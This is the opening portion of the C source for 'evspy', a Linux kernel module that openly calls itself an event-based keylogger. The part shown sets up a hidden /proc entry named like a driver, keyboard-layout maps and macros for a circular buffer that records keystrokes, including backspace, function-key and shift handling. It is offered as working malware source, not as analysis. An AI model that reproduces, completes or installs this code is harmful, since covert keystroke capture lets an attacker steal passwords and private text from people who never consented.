/*
 *   evspy - event based keylogger (Linux module)
 *
 *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
 *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
 *
 * This file is part of evspy
 *
 * evspy is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * evspy is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/cred.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <asm/page.h>
#include "khm/khm.h"

// Keyboard layouts
#define EVS_KLAY_EN		0
#define EVS_KLAY_ES		1

#define EVS_NAME		"evspy"				// driver name
#define EVS_KLAY		EVS_KLAY_ES			// change this to your keyboard layout
#define EVS_TROLL		1					// clear this if you're a serious guy
#define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
#define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc

#include "maps/maps.h"

// Event values
#define	EVS_VAL_FREE		0
#define	EVS_VAL_PRESS		1
#define	EVS_VAL_HOLD		2

#define MIN(x, y)	(x) < (y) ? (x) : (y)

/*
 * If pointer is at the end of buffer, put it at the beginning.
 * If not, simply add 1 to it.
 */
#define evs_incp(p)		\
({		\
	if ((p) == &buffer[EVS_BUFSIZE-1])		\
		(p) = buffer;		\
	else		\
		(p)++;		\
 	(p);		\
})

/*
 * Same as evs_incp but backwards
 */
#define evs_decp(p)		\
({		\
	if ((p) == buffer)		\
		(p) = &buffer[EVS_BUFSIZE-1];		\
	else		\
		(p)--;		\
 	(p);		\
})

/*
 * Insert character c where wrp is pointing and move it to the next char.
 * If rdp == wrp, increase rdp too.
 */
#define evs_insert(c)		\
({		\
	*wrp = (c);		\
	if (evs_incp(wrp) == rdp)		\
		evs_incp(rdp);		\
})

/*
 * Remove a character from the buffer
 */
#define evs_delete()		\
({		\
	if (wrp != rdp && evs_decp(wrp) == rdp)		\
		evs_decp(rdp);		\
})

/*
 * Try to delete the last char inserted. If it is a special key ("[KEY]"),
 * insert "[<<]" instead
 */
#define evs_backspace()		\
({		\
	if (*(wrp-1) != ']')		\
		evs_delete();		\
	else		\
		special_char(KEY_BACKSPACE, EVS_VAL_PRESS);		\
})

/*
 * Is the c event code associated to any of the FX buttons?
 */
#define evs_isfX(c)			\
({		\
	((c) >= KEY_F1 && (c) <= KEY_F10) ||		\
	((c) == KEY_F11 || (c) == KEY_F12) ||		\
	((c) >= KEY_F13 && (c) <= KEY_F24);		\
})

/*
 * Returns the character associated with event code c when shift is pressed
 */
#define evs_shift(c)		\
({		\
	void *__vp;		\
	char __c = (c);		\
	if (map[c] >= 'a' && map[c] <= 'z') {		\
		__c = map[c] + ('A'-'a');		\
	} else {		\
		__vp = khm_get(shm, (c));		\
		if (__vp) __c = *(char *)__vp;		\
		else __c = map[c];		\
	}		\
	__c;		\
})
